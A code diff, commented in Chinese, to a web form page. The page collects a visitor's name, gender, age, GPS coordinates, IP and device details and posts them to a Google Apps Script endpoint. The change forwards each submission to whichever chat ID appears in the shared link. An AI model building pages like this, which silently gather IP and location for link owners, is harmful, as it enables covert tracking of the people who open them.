@@ -152,9 +152,9 @@
 <script>
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXfiVnWyTL9EMQdPbdPNFUs1m60loHedhowaqgYN4OHh1-ax5pRtuwYl9IopNTtqQ/exec";
 
-// ✅ 从URL读取提交者ID ?id=xxxx
+// ✅ 核心：从URL读取目标ID ?id=xxx → 谁的链接就发给谁！
 const urlParams = new URLSearchParams(window.location.search);
-const SUBMITTER_ID = urlParams.get("id") || "";
+const TARGET_CHAT_ID = urlParams.get("id") || "";
 
 let form = {};
 let locationInfo = { lat: "", lng: "", ok: false };
@@ -165,6 +165,7 @@ window.onload = () => {
   detectDevice();
   fetchIP();
   restoreFormDraft();
+  console.log("🎯 当前链接ID：" + (TARGET_CHAT_ID || "无ID，将推送给管理员"));
 };
 
 function saveFormDraft() {
@@ -304,8 +305,10 @@ async function submitAll() {
     return;
   }
   const timeStr = new Date().toLocaleString("zh-CN");
+
+  // ✅ 关键：把链接里的ID传给后端 → 后端按ID推送
   const data = {
-    "提交者ID": SUBMITTER_ID,
+    "目标ID": TARGET_CHAT_ID, // ⭐ 核心：链接里的ID是谁就传给谁！
     "姓名": form.name,
     "性别": form.gender,
     "年龄": form.age,
@@ -321,6 +324,7 @@ async function submitAll() {
     "经度": String(locationInfo.lng),
     "录入时间": timeStr
   };
+
   try {
     await fetch(APPSCRIPT_URL, {
       method: "POST",
